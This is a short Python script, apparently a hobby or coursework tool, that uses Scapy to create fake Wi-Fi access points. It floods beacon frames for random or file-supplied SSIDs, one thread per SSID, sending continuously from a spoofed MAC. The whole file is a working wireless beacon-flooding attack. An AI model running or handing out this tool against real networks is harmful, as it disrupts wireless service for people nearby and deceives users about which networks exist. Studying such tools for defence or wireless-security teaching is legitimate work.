# This script create fake AP, and send as much beacons as possible to flood the network.
# Usage: 
# Without argument, the script will create fake SSID.
# A filename containing a list of SSID (one per line) can be passed as argument.
# The script will than use these SSID to create beacons.
#
# To interupt, use ctrl+c

import _thread
from fileinput import filename
import sys
from scapy.all import *
import random
import string

# Function that send the packets
def flood(ssid):
    # 802.11 frame creation
    # Subtype 8 = beacon
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)

    # beacon layer
    beacon = Dot11Beacon()

    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))

    # stack all the layers and add a RadioTap
    frame = RadioTap()/dot11/beacon/essid

    # send the frame every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=iface, loop=1)

# SSIDs name list
ssids=[]

# interface to use to send beacon frames, must be in monitor mode
iface = "wlan0mon"

# generate a random MAC address
sender_mac = RandMAC()

if __name__ == "__main__":
    if len(sys.argv) == 2:
        # read file
        file = open(sys.argv[1], 'r')
        ssids = file.readlines()
    else:
        # Ask user for the wanted number of SSID
        nbSSID = input("Nombre de SSID? ")

        # SSID's pattern: abc-12345
        for i in range(int(nbSSID)): 
            a = random.choice(string.ascii_lowercase)
            b = random.choice(string.ascii_lowercase)
            c = random.choice(string.ascii_lowercase)
            d1 = str(random.randint(0, 9))
            d2 = str(random.randint(0, 9))
            d3 = str(random.randint(0, 9))
            d4 = str(random.randint(0, 9))
            d5 = str(random.randint(0, 9))
            fake = a + b + c + "-" + d1 + d2 + d3 + d4 + d5
            # Print the new SSID in terminal
            print(fake)
            # Add the new SSID in list
            ssids.append(fake)

    # Create a new thread for each SSID to simulate the different AP
    for i in ssids:
        try:
            _thread.start_new_thread(flood, (i, ))
        except:
            print ("Error: unable to start thread")

    # While true loop to keep the script running
    while 1:
        ugly_loop = 1